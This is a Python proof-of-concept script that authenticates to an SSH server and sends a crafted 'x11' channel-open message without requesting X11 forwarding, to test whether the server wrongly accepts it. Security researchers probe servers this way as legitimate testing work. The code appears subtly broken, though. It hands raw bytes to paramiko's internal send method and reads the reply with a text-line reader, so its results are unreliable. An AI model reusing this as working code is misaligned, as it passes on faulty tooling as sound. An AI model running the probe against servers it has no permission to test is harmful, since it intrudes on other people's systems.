#!/usr/bin/env python3
"""
Proof-of-Concept: Missing Validation of Channel Type in X11 Forwarding

This script demonstrates a vulnerability where an SSH server fails to strictly
validate that an incoming SSH_MSG_CHANNEL_OPEN request for type 'x11' corresponds
to a previously authorized and requested X11 forwarding setup.

According to RFC 4254 Section 6.3.2:
"Implementations MUST reject any X11 channel open requests if they have not 
requested X11 forwarding."

If the server is vulnerable, it will accept the channel open request and return
a CHANNEL_OPEN_CONFIRMATION instead of a failure.
"""

import socket
import struct
import paramiko

def craft_ssh_channel_open_x11(sender_channel, window_size=0x8000, max_packet_size=32768):
    """
    Manually crafts an SSH_MSG_CHANNEL_OPEN message for type 'x11'.
    
    Format:
      byte      SSH_MSG_CHANNEL_OPEN (90)
      string    "x11"
      uint32    sender channel
      uint32    initial window size
      uint32    maximum packet size
      string    originator address (e.g., "127.0.0.1")
      uint32    originator port
    """
    msg = paramiko.Message()
    msg.add_byte(paramiko.common.CMD_CHANNEL_OPEN)
    msg.add_string("x11")
    msg.add_int(sender_channel)
    msg.add_int(window_size)
    msg.add_int(max_packet_size)
    msg.add_string("127.0.0.1")  # Originator address
    msg.add_int(6000)            # Originator port (typical X11 display)
    return msg.asbytes()

def test_x11_channel_validation(target_host, target_port, username, password):
    """
    Attempts to open an X11 channel without requesting X11 forwarding.
    """
    print(f"[*] Connecting to {target_host}:{target_port} as {username}")
    
    # Create a raw SSH transport connection
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    
    transport = paramiko.Transport(sock)
    try:
        transport.start_client()
        
        # Authenticate normally (no X11 forwarding requested)
        print(f"[*] Authenticating...")
        transport.auth_password(username=username, password=password)
        
        # Create a standard session channel (to have an active connection)
        session = transport.open_session()
        print("[+] Successfully established SSH session without X11 forwarding.")
        
        # Now attempt to open an X11 channel directly
        # This bypasses the normal request flow and tests server-side validation
        x11_channel_id = 100  # Arbitrary sender channel ID
        print(f"[*] Crafting malicious SSH_MSG_CHANNEL_OPEN for type 'x11' (sender channel: {x11_channel_id})")
        
        x11_msg = craft_ssh_channel_open_x11(x11_channel_id)
        transport._send_message(x11_msg)
        print("[+] Sent X11 channel open request.")
        
        # Wait for the server's response
        print("[*] Waiting for server response...")
        msg = transport.packetizer.readline()
        if not msg:
            print("[-] Connection closed by server during validation check.")
            return False
            
        msg_type = ord(msg[0:1])
        
        # Parse the response message
        resp_msg = paramiko.Message(msg)
        response_type = resp_msg.get_byte()
        
        if response_type == paramiko.common.CMD_CHANNEL_OPEN_CONFIRMATION:
            remote_channel_id = resp_msg.get_int()
            print(f"[!] VULNERABLE: Server accepted X11 channel open request!")
            print(f"    Received CHANNEL_OPEN_CONFIRMATION for remote channel {remote_channel_id}")
            print("    The server failed to validate that X11 forwarding was explicitly requested.")
            return True
        elif response_type == paramiko.common.CMD_CHANNEL_OPEN_FAILURE:
            reason_code = resp_msg.get_int()
            description = resp_msg.get_string().decode('utf-8', errors='ignore')
            print(f"[+] PATCHED: Server correctly rejected X11 channel open request.")
            print(f"    Reason Code: {reason_code}")
            print(f"    Description: {description}")
            return False
        else:
            print(f"[-] Unexpected response type: {response_type}")
            return None
            
    except Exception as e:
        print(f"[!] Error during test: {e}")
        return None
    finally:
        try:
            session.close()
            transport.close()
            sock.close()
        except:
            pass

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 4:
        print("Usage: python poc_missing_x11_channel_validation.py <host> <port> <username> [password]")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    user = sys.argv[3]
    passwd = sys.argv[4] if len(sys.argv) > 4 else ""
    
    result = test_x11_channel_validation(host, port, user, passwd)
    
    if result is True:
        print("\n[*] PoC Complete: Target appears VULNERABLE to missing X11 channel validation.")
        sys.exit(0)
    elif result is False:
        print("\n[*] PoC Complete: Target appears PATCHED against missing X11 channel validation.")
        sys.exit(0)
    else:
        print("\n[-] PoC Complete: Unable to determine vulnerability status.")
        sys.exit(1)